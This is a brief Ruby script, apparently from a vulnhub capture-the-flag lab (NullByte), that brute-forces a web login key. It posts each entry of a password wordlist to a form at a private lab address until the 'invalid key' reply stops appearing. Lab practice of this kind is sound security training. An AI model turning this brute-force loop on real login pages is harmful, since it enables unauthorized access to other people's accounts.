require 'httpclient'
require 'colorize'

#NullByte 0x01 challenge -- vulnhub.com
#brute force a login

 clnt=HTTPClient.new
 File.foreach( '/home/xxx/xxx/darkc0de.lst' ) do |line|
   line=line.chomp
   body = { 'key' => line }
   res = clnt.post("http://192.168.1.84/kzMb5nVYJw/index.php", body)
   unless res.body.include?("invalid key")
     puts "Found #{line}".green
     break
   end

end
